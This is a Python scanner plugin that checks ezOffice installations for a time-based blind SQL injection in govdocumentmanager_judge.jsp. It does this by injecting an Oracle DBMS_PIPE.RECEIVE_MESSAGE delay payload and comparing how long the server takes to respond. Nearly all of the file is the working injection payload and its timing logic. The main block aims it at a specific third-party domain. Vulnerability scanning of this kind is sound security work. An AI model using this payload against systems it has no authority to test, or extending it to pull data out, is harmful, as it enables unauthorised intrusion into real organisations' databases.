#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__Author__ = ADO
#_PlugName_ = ezOffice time-based blind SQL-Injection
#_FileName_ = ezoffice_sql_inj.py
#__refer__  = http://www.wooyun.org/bugs/wooyun-2010-091457

import time

def assign(service, arg):
    if service == "whezeip":
        return True, arg

def audit(arg):
    payload_normal ="defaultroot/govezoffice/gov_documentmanager/govdocumentmanager_judge.jsp?numId=1"
    payload_bug = "defaultroot/govezoffice/gov_documentmanager/govdocumentmanager_judge.jsp?numId=1%20AND%203902=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(75)||CHR(106)||CHR(82),7)"
    start_normal = time.time()
    target_normal = arg + payload_normal
    code1, head, body, errcode, _url = curl.curl2(target_normal)
    end_normal = time.time()
    times_normal = end_normal-start_normal

    start_bug = time.time()
    target_bug = arg + payload_bug
    code2, head, body, errcode, _url = curl.curl2(target_bug)
    end_bug = time.time()
    times_bug = end_bug-start_bug

    if code1 == 200 and code2==200 and times_bug-times_normal>6:
        security_hole('This ezOFFICE has Vulnerability!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('whezeip', 'http://oa.zjcof.com.cn/')[1])